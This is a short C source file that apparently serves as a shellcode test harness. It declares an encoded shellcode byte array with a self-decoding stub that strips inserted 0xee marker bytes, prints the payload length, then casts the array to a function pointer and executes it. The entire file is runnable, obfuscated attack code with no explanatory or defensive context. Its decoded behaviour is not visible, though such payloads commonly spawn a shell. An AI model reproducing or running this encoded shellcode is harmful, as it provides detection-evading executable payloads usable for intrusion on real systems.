#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x2b\x31\xdb\xf7\xe3\x5e\x89\xf2\x8d\x7e\x01\xb0\x01\x80\x34\x06\xee\x75\x0b\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xef\xd0\x0a\x8d\x52\x01\x8a\x1a\x80\xfb\xff\x74\x07\xeb\xf2\xe8\xd0\xff\xff\xff\x62\xee\x81\xee\xa0\xee\xd0\xee\x5e\xee\x5e\xee\xe6\xee\xd0\xee\xd0\xee\x5e\xee\xc4\xee\xd2\xee\xdc\xee\x13\xee\xc7\xee\xa0\xee\x13\xee\xc3\xee\x13\xee\xc5\xee\x61\xee\x16\xee\x9b\xee\x01\xee\xff";


int main(int argc, char ** argv)
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

}


	